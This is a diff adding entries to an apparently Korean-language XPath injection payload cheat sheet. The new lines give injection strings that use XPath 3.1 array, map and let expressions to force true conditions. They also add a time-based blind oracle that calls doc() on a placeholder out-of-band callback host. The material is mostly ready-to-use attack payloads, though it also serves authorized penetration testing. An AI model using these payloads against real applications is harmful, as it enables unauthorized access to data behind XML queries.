@@ -70,6 +70,15 @@ let $x := doc('http://CALLBACK/x') return $x
 - `//user[@${attr}='value']` — 속성명 자체가 입력이면 다른 속성 매칭
 - `//user[@*='admin']` (모든 속성 매칭)
 
+#### XPath 3.0+ array/map/let
+- `' or array{1,2,3}=array{1,2,3} or 'a'='b` (XPath 3.1 array)
+- `' or map{'k':'v'}('k')='v' or 'a'='b` (map literal)
+- `' or (let $x := //user return count($x)) > 0 or 'a'='b` (let expression)
+
+#### Time-based oracle (XPath 함수 직접 sleep 없음 — `doc(slow-url)` 활용)
+- `' or doc('http://CALLBACK.oast.fun/sleep') or 'a'='b` (외부 서버에서 응답 지연 → 처리 시간 차이)
+- callback 서버에서 5초 지연 후 응답 → 정상 응답 시간과 차이로 판정
+
 ---
 
 ### 우회 페이로드
